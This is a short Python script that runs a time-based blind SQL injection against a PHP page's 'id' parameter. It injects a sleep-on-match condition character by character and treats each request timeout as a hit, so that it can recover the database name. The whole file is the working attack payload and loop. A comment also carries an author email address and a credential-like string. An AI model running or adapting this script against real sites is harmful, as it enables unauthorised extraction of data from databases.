import requests

###author:13776049410@139.com
###admintest@admintest

url = "http://www.test.cc/xs.php?id=41 and If(ascii(substr(database(),%d,1))=%d,sleep(3),1)"

for j in range(1,16):
    for i in range(32,129,1):
        try:
            response = requests.get(url%(j,i), timeout=3)
        except Exception as e:
            print(chr(i))
